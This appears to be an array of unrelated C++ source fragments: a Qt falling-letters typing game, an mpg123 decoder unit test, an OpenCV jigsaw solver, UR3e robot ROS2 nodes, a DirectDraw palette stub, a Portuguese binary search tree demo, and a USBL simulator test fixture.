\u4f7f\u7528\u968f\u673a\u6570\u751f\u6210\u5668\u751f\u6210 500 \u4e2a\u968f\u673a\u6570\u5e76\u63d2\u5165 wordTable\r\n    // std::random_device rd;  // \u7528\u4e8e\u751f\u6210\u968f\u673a\u79cd\u5b50\r\n    // std::mt19937 gen(rd()); // \u4f7f\u7528 Mersenne Twister \u5f15\u64ce\r\n    // std::uniform_int_distribution<> distrib(1, 99999); // \u8bbe\u7f6e\u968f\u673a\u6570\u8303\u56f4\uff0c\u5047\u8bbe\u8303\u56f4\u662f 1 \u5230 99999\r\n\r\n    // for(int i=0; i<500; i++) {\r\n    //     int randomNumber = distrib(gen);\r\n    //     wordTable.append(QString::number(randomNumber));\r\n    // }\r\n\r\n    // // \u968f\u673a\u8bfb\u53d6 1000 \u4e2a\u5355\u8bcd\u5e76\u63d2\u5165 wordTable\r\n    // QFile file(QCoreApplication::applicationDirPath() + \"/words.txt\");\r\n    // QStringList allWords;  // \u5b58\u50a8\u4ece\u6587\u4ef6\u4e2d\u8bfb\u53d6\u7684\u6240\u6709\u5355\u8bcd\r\n\r\n    // // 1. \u8bfb\u53d6\u6587\u4ef6\u5e76\u5b58\u50a8\u6240\u6709\u5355\u8bcd\u5230 allWords \u5217\u8868\r\n    // if (file.open(QIODevice::ReadOnly | QIODevice::Text)) {\r\n    //     QTextStream in(&file);\r\n\r\n    //     while (!in.atEnd()) {\r\n    //         QString line = in.readLine().trimmed();  // \u53bb\u9664\u53ef\u80fd\u7684\u7a7a\u683c\u6216\u6362\u884c\u7b26\r\n    //         if (!line.isEmpty()) {\r\n    //             allWords.append(line);  // \u5c06\u6bcf\u884c\u5185\u5bb9\uff08\u5373\u5355\u8bcd\uff09\u52a0\u5165 allWords \u5217\u8868\r\n    //         }\r\n    //     }\r\n    //     file.close();\r\n    // } else {\r\n    //     qDebug() << \"open words.txt failed!\";\r\n    // }\r\n\r\n    // // 2. \u68c0\u67e5\u6587\u4ef6\u4e2d\u662f\u5426\u6709\u8db3\u591f\u7684\u5355\u8bcd\r\n    // if (allWords.size() < 1000) {\r\n    //     qDebug() << \"Not enough words in the file!\";\r\n    // } else {\r\n    //     // 3. \u4f7f\u7528\u968f\u673a\u6570\u751f\u6210\u5668\u968f\u673a\u9009\u62e9 1000 \u4e2a\u5355\u8bcd\r\n    //     std::random_device rd;  // \u7528\u4e8e\u751f\u6210\u968f\u673a\u79cd\u5b50\r\n    //     std::mt19937 gen(rd()); // \u4f7f\u7528 Mersenne Twister \u5f15\u64ce\r\n    //     std::uniform_int_distribution<> distrib(0, allWords.size() - 1);  // \u751f\u6210 0 \u5230 allWords.size()-1 \u4e4b\u95f4\u7684\u968f\u673a\u6570\r\n\r\n    //     QSet<int> selectedIndices;  // \u7528\u4e8e\u5b58\u50a8\u5df2\u7ecf\u9009\u8fc7\u7684\u7d22\u5f15\uff0c\u9632\u6b62\u91cd\u590d\u9009\u62e9\r\n\r\n    //     while (selectedIndices.size() < 1000) {\r\n    //         int randomIndex = distrib(gen);  // \u751f\u6210\u968f\u673a\u7d22\u5f15\r\n    //         if (!selectedIndices.contains(randomIndex)) {\r\n    //             selectedIndices.insert(randomIndex);  // \u8bb0\u5f55\u9009\u4e2d\u7684\u7d22\u5f15\uff0c\u9632\u6b62\u91cd\u590d\r\n    //             wordTable.append(allWords[randomIndex]);  // \u968f\u673a\u9009\u62e9\u5355\u8bcd\u5e76\u63d2\u5165 wordTable\r\n    //         }\r\n    //     }\r\n\r\n    //     // qDebug() << \"Successfully added 1000 random words to wordTable!\";\r\n    // }\r\n\r\n    // ================================Generating Dropping Letters==============================================\r\n\r\n    // Randomly generate letters and add into wordTable\r\n    std::random_device rd;\r\n    std::mt19937 gen(rd());\r\n\r\n    // J,Z is expelled from the letter list because of its particularity.\r\n    std::uniform_int_distribution<> distrib(0, 23);\r\n    const QString alphabet = \"ABCDEFGHIKLMNOPQRSTUVWXY\";\r\n    for(int i = 0; i < 24; i++) {\r\n        int randomIndex = distrib(gen);\r\n        wordTable.append(alphabet[randomIndex]);\r\n    }\r\n\r\n    // ===========================================================================================================\r\n\r\n    effect = new QSoundEffect(this);\r\n    effect->setSource(QUrl(\"qrc:/effect/sounds/eject.wav\"));\r\n    effect->setLoopCount(1);\r\n    effect->setVolume(0.2f);\r\n\r\n    effectBoom = new QSoundEffect(this);\r\n    effectBoom->setSource(QUrl(\"qrc:/effect/sounds/wordBoom.wav\"));\r\n    effectBoom->setLoopCount(1);\r\n    effectBoom->setVolume(30.0f);\r\n\r\n    setStyleSheet(\"background-color:#f7f9fc\");\r\n\r\n    // Simulate the recoil of a cannon\r\n    timerCannon = new QTimer(this);\r\n    timerCannon->setSingleShot(true);  // This parameter is set to trigger once.\r\n    connect(timerCannon, &QTimer::timeout, this, [=](){\r\n        cannonLen = 220;\r\n        update();\r\n    });  // When the timer expires, reset the barrel length to 220 and call the update() function to refresh the window. This is used to handle the firing animation and the bullet firing process.\r\n\r\n\r\n    // ====================================Set the game main timer timerRunning==========================================\r\n\r\n    timerRunning = new QTimer(this);  // Used to handle enemy (word) movement and status updates\r\n\r\n    // Connect the GameWidget's togglePause signal to the GameWindowLabel's onTogglePause slot function\r\n    connect((GameWidget *)parent, &GameWidget::togglePause, this, &GameWindowLabel::onTogglePause);\r\n\r\n    connect(timerRunning, &QTimer::timeout, this, [=](){\r\n        if(begin == false || isPaused == true) {\r\n            return;\r\n        }\r\n\r\n      ",
    "#include \"catch.hpp\"\n#include \"adts_mpg123.h\"\n\nclass MemoryStreamer : public ifc_mpeg_stream_reader\n{\npublic:\n\tMemoryStreamer(){}\n\tint Peek(void *buffer, size_t to_read, size_t *bytes_read)\n\t{\n\t\tif (to_read > this->bufferBytes) {\n\t\t\tto_read = this->bufferBytes;\n\t\t}\n\t\tmemcpy(buffer, this->buffer, to_read);\n\t\t*bytes_read =  to_read;\n\t\treturn adts::SUCCESS;\n\t}\n\n\tint Read(void *buffer, size_t to_read, size_t *bytes_read)\n\t{\n\t\tif (to_read > this->bufferBytes) {\n\t\t\tto_read = this->bufferBytes;\n\t\t}\n\t\tmemcpy(buffer, this->buffer, to_read);\n\t\tthis->buffer = (unsigned char *)this->buffer + *bytes_read;\n\t\t*bytes_read =  to_read;\n\t\tbufferBytes -= to_read;\n\t\treturn adts::SUCCESS;\n\t}\n\n\tint EndOf()\n\t{\n\t\tif (bufferBytes == 0) {\n\t\t\treturn 1;\n\t} else {\n\t\t\treturn 0;\n\t}\n\t}\n\tfloat GetGain()\n\t{\n\t\treturn 1.0;\n\t}\n\tunsigned char *buffer;\n\tsize_t bufferBytes;\n\tRECVS_DISPATCH;\n};\n\n#define CBCLASS MemoryStreamer\nSTART_DISPATCH;\nCB(MPEGSTREAM_PEEK, Peek)\nCB(MPEGSTREAM_READ, Read)\nCB(MPEGSTREAM_EOF, EndOf)\nCB(MPEGSTREAM_GAIN, GetGain)\nEND_DISPATCH;\n#undef CBCLASS\n\nstatic const unsigned char mp3_frame1[] =  {\n\t0xFF, 0xF3, 0x70, 0x54, 0x00, 0x10, 0x2D, 0xFA, 0x96, 0x0F, 0xA0, 0x20,\n\t0x00, 0x81, 0xE8, 0x05, 0x2C, 0x1F, 0x40, 0x00, 0x00, 0x03, 0x51, 0xB6,\n\t0x1B, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xF3,\n\t0x0B, 0x05, 0x86, 0x07, 0x60, 0x2E, 0x11, 0x94, 0x0A, 0x01, 0x61, 0xA0,\n\t0xD0, 0xC2, 0xC5, 0xCF, 0x81, 0x41, 0x43, 0x2F, 0x44, 0x4E, 0x6E, 0x1F,\n\t0xFF, 0xFF, 0xFF, 0xFF, 0xF2, 0x01, 0xA0, 0xA2, 0x8B, 0x87, 0xF6, 0x2E,\n\t0x7A, 0x0A, 0x19, 0x25, 0x9F, 0x02, 0xF6, 0x40, 0xA1, 0x92, 0x2E, 0x2E,\n\t0x7F, 0xEE, 0xFF, 0x96, 0x1E, 0x0E, 0x2C, 0x1B, 0x87, 0xEC, 0x1C, 0x07,\n\t0x8A, 0x1C, 0x18, 0x58, 0x76, 0x7C, 0x0A, 0x07, 0x86, 0x5E, 0x88, 0x94,\n\t0xEF, 0x02, 0xF6, 0x82, 0x86, 0x49, 0x67, 0xC0, 0xBD, 0x90, 0x28, 0x64,\n\t0x8B, 0x8B, 0xDF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xBC,\n\t0x3D, 0xA0, 0xA2, 0x4B, 0x8B, 0x8B, 0x8A, 0x51, 0x60, 0xDC, 0x5D, 0x85,\n\t0x03, 0xC3, 0x2C, 0x00, 0x03, 0x31, 0xE0, 0x00, 0x7F};\nTEST_CASE(\"\", \"[adts_mpg123]\") {\n\n\tmpg123_init();\n\tADTS_MPG123 mp3;\n\tMemoryStreamer memoryStreamer;\n\tREQUIRE(mp3.Initialize(false, false, false, 16, true, true, true) == adts::SUCCESS);\n\tREQUIRE(mp3.Open(&memoryStreamer) == true);\n\tsize_t numBits;\n\tsize_t numChannels;\n\tint sampleRate;\n\tmemoryStreamer.buffer = (unsigned char *)mp3_frame1;\n\tmemoryStreamer.bufferBytes = sizeof(mp3_frame1);\n\tsize_t outputWritten=777;\n\tsize_t bitrate=777;\n\tREQUIRE(mp3.Sync(&memoryStreamer, 0, 0, &outputWritten, &bitrate) == adts::SUCCESS);\n\tREQUIRE(bitrate == 64);\n\tREQUIRE(outputWritten == 0);\n\n}",
    "#include <algorithm>\n#include <filesystem>\n#include <optional>\n#include <ranges>\n#include <stack>\n#include <span>\n#include <iostream>\n#include <fstream>\n#include <libgen.h>\n\n#include <opencv2/core/mat.hpp>\n#include <opencv2/imgcodecs.hpp>\n#include <opencv2/imgproc.hpp>\n\n#include \"timer.h\"\n\nconstexpr int PUZZLE_GRID_SIZE = 16;\nconstexpr int PUZZLE_SIZE = 256;\nconstexpr const char* ASSETS_DIR = \"assets/assets_png\";\nconstexpr double FIRST_COL_WIDTH = 240.0;\nconstexpr double FIRST_ROW_HEIGHT = 135.0;\nconstexpr int IMAGE_WIDTH = 3840;\nconstexpr int IMAGE_HEIGHT = 2160;\nconstexpr size_t HASH_MAGIC_NUMBER = 0x9e379967;\n\nenum class Side { LEFT, TOP, RIGHT, BOTTOM };\nconstexpr std::array<std::pair<int, int>, 4> offsets = {\n    std::pair{-1, 0}, // Side::LEFT\n    std::pair{0, -1}, // Side::TOP\n    std::pair{1, 0}, // Side::RIGHT\n    std::pair{0, 1} // Side::BOTTOM\n};\n\nstruct PuzzlePiece {\n  PuzzlePiece() = default;\n  ~PuzzlePiece() = default;\n  PuzzlePiece(const PuzzlePiece&) = default;\n  PuzzlePiece& operator=(const PuzzlePiece&) = default;\n  PuzzlePiece(PuzzlePiece&&) noexcept = default;\n  PuzzlePiece& operator=(PuzzlePiece&&) noexcept = default;\n  bool operator<(const PuzzlePiece& other) const {\n    if ((col == 0 || row == 0) && (other.col != 0 && other.row != 0)) {\n      return true;\n    }\n    if ((other.col == 0 || other.row == 0) && (col != 0 && row != 0)) {\n      return false;\n    }\n    if (col == 0 && row == 0) {\n      return true;\n    }\n    if (other.col == 0 && other.row == 0) {\n      return false;\n    }\n    return (col + row) < (other.col + other.row);\n  }\n  size_t id;\n  cv::Mat image;\n  int col{-1};\n  int row{-1};\n  size_t edge_hashes[4];\n\n  cv::Rect rect() const {\n    const auto top_left =\n        cv::Point2f(FIRST_COL_WIDTH * col - (col > 0 ? 1.0 : 0.0), FIRST_ROW_HEIGHT * row - (row > 0 ? 1.0 : 0.0));\n    return cv::Rect(top_left, cv::Size(image.cols, image.rows));\n  }\n  void move(const int source_col, const int source_row, const Side side) {\n    const auto& [col_offset, row_offset] = offsets[static_cast<int>(side)];\n    col = source_col + col_offset;\n    row = source_row + row_offset;\n  }\n};\n\nsize_t computeHash(const cv::Mat& edge) {\n  size_t hash = 0;\n  for (int row = 0; row < edge.rows; ++row) {\n    const uchar* data = edge.ptr<uchar>(row);\n    for (int col = 0; col < edge.cols; ++col) {\n      hash ^= (data[col] / 10) + HASH_MAGIC_NUMBER + (hash << 6) + (hash >> 2);\n    }\n  }\n  return hash;\n}\n\nvoid computeEdgeHashes(PuzzlePiece& piece) {\n  cv::Mat gray;\n  cv::cvtColor(piece.image, gray, cv::COLOR_BGR2GRAY);\n\n  piece.edge_hashes[0] = computeHash(gray.col(0));\n  piece.edge_hashes[1] = computeHash(gray.row(0));\n  piece.edge_hashes[2] = computeHash(gray.col(gray.cols - 1));\n  piece.edge_hashes[3] = computeHash(gray.row(gray.rows - 1));\n}\n\nclass PuzzlePieceProcessor : public cv::ParallelLoopBody {\n public:\n  PuzzlePieceProcessor(const std::span<const std::string>& file_paths, const std::span<PuzzlePiece>& pieces) :\n      file_paths_(file_paths), pieces_(pieces) {}\n\n  void operator()(const cv::Range& range) const override {\n    for (int i = range.start; i < range.end; ++i) {\n      cv::Mat image = cv::imread(file_paths_[i], cv::IMREAD_COLOR);\n      auto& piece = pieces_[i];\n      piece.id = i;\n      if (image.cols == FIRST_COL_WIDTH) {\n        piece.col = 0;\n      }\n      if (image.rows == FIRST_ROW_HEIGHT) {\n        piece.row = 0;\n      }\n      piece.image = std::move(image);\n      computeEdgeHashes(piece);\n    }\n  }\n\n private:\n  const std::span<const std::string>& file_paths_;\n  std::span<PuzzlePiece> pieces_;\n};\n\n[[nodiscard]] std::array<PuzzlePiece, PUZZLE_SIZE> loadPuzzle(const std::string_view& path) {\n  std::vector<std::string> file_paths;\n  file_paths.reserve(PUZZLE_SIZE);\n  for (const auto& entry : std::filesystem::directory_iterator(path)) {\n    file_paths.push_back(entry.path());\n  }\n\n  std::array<PuzzlePiece, PUZZLE_SIZE> pieces;\n  cv::parallel_for_(cv::Range(0, static_cast<int>(file_paths.size())), PuzzlePieceProcessor(file_paths, pieces),\n                    cv::getNumThreads());\n\n  return pieces;\n}\n\nusing HashMapType = std::array<std::unordered_multimap<size_t, PuzzlePiece*>, 4>;\n\nHashMapType buildHashMap(std::array<PuzzlePiece, PUZZLE_SIZE>& pieces) {\n  HashMapType hash_maps;\n  for (auto& piece : pieces) {\n    for (int i = 0; i < 4; ++i) {\n      hash_maps[i].emplace(piece.edge_hashes[i], &piece);\n    }\n  }\n  return hash_maps;\n}\n\nvoid assemblePuzzle(std::array<PuzzlePiece, PUZZLE_SIZE>& pieces) {\n  std::sort(pieces.begin(), pieces.end());\n\n  const auto hash_maps = buildHashMap(pieces);\n\n  std::stack<PuzzlePiece*> stack;\n  stack.push(&pieces[0]);\n\n  while (!stack.empty()) {\n    const auto current_piece = stack.top();\n    stack.pop();\n\n    if (current_piece->col != -1 && current_piece->row != -1) {\n      continue;\n    }\n    if (current_piece->col == PUZZLE_GRID_SIZE - 1 || current_piece->row == PUZZLE_GRID_SIZE - 1) {\n      continue;\n    }\n\n    auto right_it = hash_maps[0].find(current_piece->",
    "#include <ur3e_mrc/ur3e_mrc_enme480_topics.hpp>\n\n\nclass UR3eENME480JS : public rclcpp::Node\n{\npublic:\n  UR3eENME480JS() : Node(\"ur3e_mrc_enme480_js\")\n  {\n    sub_js_ = this->create_subscription<sensor_msgs::msg::JointState>(\n      \"joint_states\", 10, std::bind(&UR3eENME480JS::js_callback, this, std::placeholders::_1));\n    RCLCPP_INFO(this->get_logger(), \"Subscribed to joint states\");\n\n    pos_pub_ = this->create_publisher<ur3e_mrc::msg::PositionUR3e>(\"ur3/position\", 10);\n  }\n\nprivate:\n  void js_callback(const sensor_msgs::msg::JointState & msg) const\n  {\n    ur3e_mrc::msg::PositionUR3e pos_msg;\n\n    pos_msg.position = {msg.position[5] - boost::math::constants::pi<double>() / 2, msg.position[0], msg.position[1], msg.position[2] + boost::math::constants::pi<double>() / 2, msg.position[3], msg.position[4]};\n    pos_msg.is_ready = true;\n\n    pos_pub_->publish(pos_msg);\n  }\n\n  rclcpp::Subscription<sensor_msgs::msg::JointState>::SharedPtr sub_js_;\n  rclcpp::Publisher<ur3e_mrc::msg::PositionUR3e>::SharedPtr pos_pub_;\n};\n\nclass UR3eENME480IO : public rclcpp::Node\n{\npublic:\n  UR3eENME480IO() : Node(\"ur3e_mrc_enme480_io\")\n  {\n    sub_io_ = this->create_subscription<ur_msgs::msg::IOStates>(\n      \"/io_and_status_controller/io_states\", 10, std::bind(&UR3eENME480IO::io_callback, this, std::placeholders::_1));\n    RCLCPP_INFO(this->get_logger(), \"Subscribed to hardware io states\");\n    \n\n    grip_grasp_pub_ = this->create_publisher<std_msgs::msg::Bool>(\"gripper/grasping\", 10);\n    grip_inp_pub_ = this->create_publisher<ur3e_mrc::msg::GripperInput>(\"ur3/gripper_input\", 10);\n\n  }\n\nprivate:\n  void io_callback(const ur_msgs::msg::IOStates & msg) const\n  { \n    std_msgs::msg::Bool grip_grasp_msg;\n    ur3e_mrc::msg::GripperInput grip_inp_msg;\n\n    grip_grasp_msg.data = msg.digital_in_states[0].state;\n\n    if (msg.digital_in_states[0].state)\n      grip_inp_msg.dig_in = 1;\n    else\n      grip_inp_msg.dig_in = 0;\n\n    grip_inp_msg.a_in0 = msg.analog_in_states[0].state;\n    grip_inp_msg.a_in1 = 0.0;\n\n    grip_grasp_pub_->publish(grip_grasp_msg);\n    grip_inp_pub_->publish(grip_inp_msg);\n    \n  }\n\n  rclcpp::Subscription<ur_msgs::msg::IOStates>::SharedPtr sub_io_;\n  rclcpp::Publisher<std_msgs::msg::Bool>::SharedPtr grip_grasp_pub_;\n  rclcpp::Publisher<ur3e_mrc::msg::GripperInput>::SharedPtr grip_inp_pub_;\n};\n\n\nint main(int argc, char * argv[])\n{\n  rclcpp::init(argc, argv);\n\n  rclcpp::executors::MultiThreadedExecutor executor;\n  auto jsnode = std::make_shared<UR3eENME480JS>();\n  auto ionode = std::make_shared<UR3eENME480IO>();\n  executor.add_node(jsnode);\n  executor.add_node(ionode);\n  executor.spin();\n\n  // rclcpp::spin(std::make_shared<UR3eENME480Topics>());\n  rclcpp::shutdown();\n\n  return 0;\n}",
    "#ifndef CINTERFACE\n#define CINTERFACE\n#endif\n\n#include \"IDirectDrawPalette.h\"\n\n#ifndef WIN32_LEAN_AND_MEAN\n#define WIN32_LEAN_AND_MEAN\n#endif\n#include <Windows.h>\n#include <memory.h>\n#include <string.h>\n\n#include <format>\n#include <string>\n#include <string_view>\n\n#define INTERFACE OglDirectDrawPalette\n\nstatic OglDirectDrawPaletteVtable vtable = {};\n\nstatic void DisplayMessage(std::string_view msg) {\n  // MessageBox(NULL, msg.data(), \"DirectDrawPalette_null\", MB_OK);\n}\n\nHRESULT __stdcall OglPalette_QueryInterface(OglDirectDrawPalette* This, REFIID riid, LPVOID FAR* ppvObj) {\n  if (!*ppvObj) return E_INVALIDARG;\n\n  if (!IsEqualGUID(riid, IID_IDirectDrawPalette)) {\n    return E_NOINTERFACE;\n  }\n\n  OglDirectDrawPalette* palette = (OglDirectDrawPalette*)malloc(sizeof(OglDirectDrawPalette));\n\n  memcpy(&palette->guid, &riid, sizeof(palette->guid));\n  palette->lpVtbl = &vtable;\n  palette->ref = 1;\n\n  *ppvObj = palette;\n\n  return S_OK;\n}\n\nULONG __stdcall OglPalette_AddRef(OglDirectDrawPalette* This) {\n  ULONG ret = ++This->ref;\n\n  return ret;\n}\n\nULONG __stdcall OglPalette_Release(OglDirectDrawPalette* This) {\n  ULONG ret = --This->ref;\n\n  if (ret == 0) {\n    free(This);\n  }\n\n  return ret;\n}\n\nHRESULT __stdcall OglPalette_GetCaps(OglDirectDrawPalette* This, LPDWORD) {\n  DisplayMessage(\"GetCaps\");\n  return S_OK;\n}\n\nHRESULT __stdcall OglPalette_GetEntries(OglDirectDrawPalette* This, DWORD, DWORD, DWORD, LPPALETTEENTRY) {\n  DisplayMessage(\"GetEntries\");\n  return S_OK;\n}\n\nHRESULT __stdcall OglPalette_Initialize(OglDirectDrawPalette* This, LPDIRECTDRAW, DWORD, LPPALETTEENTRY) {\n  DisplayMessage(\"Initialize\");\n  return S_OK;\n}\n\nHRESULT __stdcall OglPalette_SetEntries(OglDirectDrawPalette* This, DWORD, DWORD, DWORD, LPPALETTEENTRY) {\n  DisplayMessage(\"SetEntries\");\n  return S_OK;\n}\n\nIDirectDrawPalette* __stdcall OglDirectDrawCreatePalette(LPPALETTEENTRY entry) {\n  vtable.QueryInterface = OglPalette_QueryInterface;\n  vtable.AddRef = OglPalette_AddRef;\n  vtable.Release = OglPalette_Release;\n  vtable.GetCaps = OglPalette_GetCaps;\n  vtable.GetEntries = OglPalette_GetEntries;\n  vtable.Initialize = OglPalette_Initialize;\n  vtable.SetEntries = OglPalette_SetEntries;\n\n  OglDirectDrawPalette* palette = (OglDirectDrawPalette*)malloc(sizeof(OglDirectDrawPalette));\n\n  memcpy(&palette->guid, &IID_IDirectDrawPalette, sizeof(palette->guid));\n  palette->lpVtbl = &vtable;\n  IDirectDrawPalette_AddRef(palette);\n\n  return (IDirectDrawPalette*)palette;\n}\n",
    "//Bibliotecas necess\u00e1rias\r\n#include <iostream>\r\n#include <stdio.h>\r\n#include <stdlib.h>\r\n#include \"ArvoreBinariaBusca.h\"\r\n\r\nusing namespace std;\r\n\r\n\r\n//Fun\u00e7\u00e3o principal para demonstrar o uso da \u00c1rvore Bin\u00e1ria de Busca\r\nint main() {\r\n\r\n    int x; //Vari\u00e1vel utilizada para receber o valor digitado do usu\u00e1rio e colocar na \u00c1rvore Bin\u00e1ria de Busca\r\n    int opcao; //vari\u00e1vel utilizada no Menu para testar a \u00e1rvore\r\n    int modo; //vari\u00e1vel utilizada na escolha do percurso na \u00e1rvore\r\n\r\n    ArvoreBinariaBusca_Construtor();  //para iniciar a \u00e1rvore\r\n\r\n\r\n\r\n    do {  //menu com op\u00e7\u00f5es para testar a implementa\u00e7\u00e3o da \u00e1rvore\r\n\r\n\r\n        system(\"cls\");\r\n\r\n        cout << \"Programa para uso da Arvore Binaria de Busca\\n\\n\";\r\n        cout << \"Escolha uma das opcoes a seguir:\";\r\n        cout << \"\\n\\n\\nMenu: \\n\";\r\n        cout << \"\\n1 - Inserir\";\r\n        cout << \"\\n2 - Pesquisar\";\r\n        cout << \"\\n3 - Numero de elementos na arvore\";\r\n        cout << \"\\n4 - Vazia\";\r\n        cout << \"\\n5 - Percurso\";\r\n        cout << \"\\n6 - Nivel\";\r\n        cout << \"\\n7 - Sair\\n\";\r\n        cout << \"\\nOpcao: \";\r\n        cin >> opcao;\r\n\r\n        system(\"cls\");\r\n\r\n        switch (opcao) {\r\n\r\n            case 1:\r\n                cout << \"\\n\\nDigite o dado: \";\r\n                setbuf(stdin, NULL);\r\n                cin >> x;\r\n\r\n                if (ArvoreBinariaBusca_Inserir(x))\r\n                    cout << \"Elemento inserido\\n\\n\";\r\n                else cout << \"Erro ao inserir elemento.\\n\\n\";\r\n\r\n                system(\"pause\");\r\n                break;\r\n\r\n\r\n            case 2:\r\n                cout << \"\\nDigite o elemento para pesquisa: \";\r\n                setbuf(stdin, NULL);\r\n                cin >> x;\r\n\r\n                if (ArvoreBinariaBusca_Pesquisar(x))\r\n                    cout << \"Elemento encontrado.\\n\\n\";\r\n                else cout << \"Elemento nao encontrado.\\n\\n\";\r\n\r\n                system(\"pause\");\r\n                break;\r\n\r\n            case 3:\r\n                cout << \"\\n\\nNumero de elementos na arvore: \" << ArvoreBinariaBusca_Tamanho() << \"\\n\\n\";\r\n                system(\"pause\");\r\n                break;\r\n\r\n            case 4:\r\n                if (ArvoreBinariaBusca_Vazia())\r\n                    cout << \"Arvore vazia.\\n\\n\";\r\n                else cout << \"A arvore nao esta vazia.\\n\\n\";\r\n\r\n                system(\"pause\");\r\n                break;\r\n\r\n            case 5:\r\n                cout << \"\\n\\n\\nMenu: \\n\";\r\n                cout << \"\\n1 - Pre-ordem\";\r\n                cout << \"\\n2 - Em-ordem\";\r\n                cout << \"\\n3 - Pos-ordem\\n\";\r\n                cout << \"\\nOpcao: \";\r\n                cin >> modo;\r\n                ArvoreBinariaBusca_Percurso(modo);\r\n                break;\r\n\r\n            case 6:\r\n                int nivel;\r\n            cout << \"Digite o nivel que deseja imprimir: \";\r\n            cin >> nivel;\r\n            ArvoreBinariaBusca_Imprimir_Por_Nivel(nivel);\r\n            system(\"pause\");\r\n            break;\r\n\r\n            case 7:\r\n                ArvoreBinariaBusca_Destrutor();\r\n                break;\r\n\r\n            default:\r\n                cout << \"\\n\\nOpcao invalida\\n\\n\";\r\n                system(\"pause\");\r\n        }\r\n    } while (opcao != 6);\r\n\r\n\r\n    return 0;\r\n}\r\n",
    "/*@license BSD-3 https://opensource.org/licenses/BSD-3-Clause\nCopyright (c) 2024, Institute of Automatic Control - RWTH Aachen University\nMaximilian Nitsch (m.nitsch@irt.rwth-aachen.de)\nAll rights reserved.\n*/\n\n#include \"usbl_simulator.hpp\"\n\n#include \"gtest/gtest.h\"\n\n/**\n * @brief Test fixture for the USBL simulator class.\n*/\nclass UsblSimulatorTest : public ::testing::Test {\n protected:\n  void SetUp() override {\n    // Set the USBL simulation parameters\n    usblSimParams.speed_of_sound = 1500.0;\n    usblSimParams.max_range = 500.0;\n    usblSimParams.rtt_std_dev = 0.01 / 1500;\n    usblSimParams.tdoa_std_dev = 2.60296781192103e-07;\n    usblSimParams.rtt_resolution = 1.0e-06;\n    usblSimParams.tdoa_resolution = 1.0e-06;\n    usblSimParams.usblAhrsNoiseStdDev =\n        Eigen::Vector3d(0.2, 0.2, 1.0) * M_PI / 180;\n    usblSimParams.p_bu_b = Eigen::Vector3d(0.0, 0.0, 0.0);\n    usblSimParams.C_u_b = Eigen::Matrix3d::Identity();\n    usblSimParams.p_usTC_u = Eigen::Vector3d(-80e-3, 0, 39.904e-3);\n    usblSimParams.p_usH_u << -0.022275, -0.022275, -0.014696, -0.022275,\n        0.022275, -0.014696, 0.022275, -0.022275, -0.014696, 0.022275, 0.022275,\n        -0.014696, 0.0, 0.0, 0.058784;\n\n    // Set the USBL enable settings\n    usblModelEnableSettings.enable_rtt_noise_model = false;\n    usblModelEnableSettings.enable_tdoa_noise_model = false;\n    usblModelEnableSettings.enable_rtt_quantization_model = false;\n    usblModelEnableSettings.enable_tdoa_quantization_model = false;\n    usblModelEnableSettings.enable_acoustic_path_delay = false;\n    usblModelEnableSettings.enable_fix_loss_rate_model = false;\n    usblModelEnableSettings.enable_fix_outlier_model = false;\n    usblModelEnableSettings.enable_ahrs_noise_model = false;\n\n    // Set the USBL fix loss model simulation parameters\n    usblFixLossModelSimParams.a = -6.07039718341056;\n    usblFixLossModelSimParams.b = 0.00212458825600739;\n    usblFixLossModelSimParams.c = 5.98749360969012;\n    usblFixLossModelSimParams.d = 0.00225378907075506;\n\n    // Random number generator seed\n    unsigned int seed = 42;\n\n    // Initialize the USBL simulator class\n    pUsblSimulator = std::make_unique<usbl_simulator::UsblSimulator>(\n        usblSimParams, usblFixLossModelSimParams, usblModelEnableSettings,\n        seed);\n  }\n\n  // Simulation parameters for EvoLogics OEM USBL\n  usbl_simulator::UsblSimParams usblSimParams;\n\n  // USBL model enable settings\n  usbl_simulator::UsblModelEnableSettings usblModelEnableSettings;\n\n  // USBL fix loss model simulation parameters\n  usbl_simulator::UsblFixLossModelSimParams usblFixLossModelSimParams;\n\n  // Declare the class under test\n  std::unique_ptr<usbl_simulator::UsblSimulator> pUsblSimulator;\n};\n\n/**\n * @brief Tests the transceiver hydrophone array geometry and the Moore-Penrose\n *        pseudoinverse of the geometry matrix.\n */\nTEST_F(UsblSimulatorTest, TrannsceiverHydrophoneArrayGeometryTest) {\n  // Get transceiver hydrophone positions\n  Eigen::Matrix<double, 5, 3> p_usH_u =\n      pUsblSimulator->getTransceiverHydroPositions();\n\n  // Get Moore-Penrose pseudoinverse of the geometry matrix\n  Eigen::Matrix<double, 3, 10> Tplus = pUsblSimulator->getTplus();\n\n  // Expected transceiver hydrophone positions\n  Eigen::Matrix<double, 5, 3> p_usH_u_expected;\n  p_usH_u_expected << -0.022275, -0.022275, -0.014696, -0.022275, 0.022275,\n      -0.014696, 0.022275, -0.022275, -0.014696, 0.022275, 0.022275, -0.014696,\n      0, 0, 0.058784;\n\n  // Expected Moore-Penrose pseudoinverse of the geometry matrix\n  Eigen::Matrix<double, 3, 10> Tplus_expected;\n  Tplus_expected << 0, -4.48933782267116, -4.48933782267116, -2.24466891133558,\n      -4.48933782267116, -4.48933782267116, -2.24466891133558, 0.0,\n      2.24466891133558, 2.24466891133558, -4.48933782267115,\n      -2.78623361756147e-16, -4.48933782267116, -2.24466891133558,\n      4.48933782267116, -2.78623361756147e-16, 2.24466891133558,\n      -4.48933782267116, -2.24466891133558, 2.24466891133558, 0.0, 0.0, 0.0,\n      -3.40228633641807, 0.0, 0.0, -3.40228633641807, 0.0, -3.40228633641807,\n      -3.40228633641807;\n\n  // Compare the hydrophone positions\n  for (int i = 0; i < 5; i++) {\n    for (int j = 0; j < 3; j++) {\n      EXPECT_NEAR(p_usH_u(i, j), p_usH_u_expected(i, j), 1e-10);\n    }\n  }\n  // Compare the Moore-Penrose pseudoinverse of the geometry matrices\n  for (int i = 0; i < 3; i++) {\n    for (int j = 0; j < 10; j++) {\n      EXPECT_NEAR(Tplus(i, j), Tplus_expected(i, j), 1e-10);\n    }\n  }\n}\n/**\n * @brief Tests the round trip time measurement model.\n */\nTEST_F(UsblSimulatorTest, RttMeasurementModelTest) {\n  // Enable the RTT noise model\n  pUsblSimulator->setEnableRttNoiseModel(true);\n  pUsblSimulator->setUseFixedRandomNumbers(true);\n\n  Eigen::Vector3d p_nb_n = Eigen::Vector3d(50.0, -10.0, 75.0);\n  Eigen::Matrix3d C_b_n;\n  C_b_n << 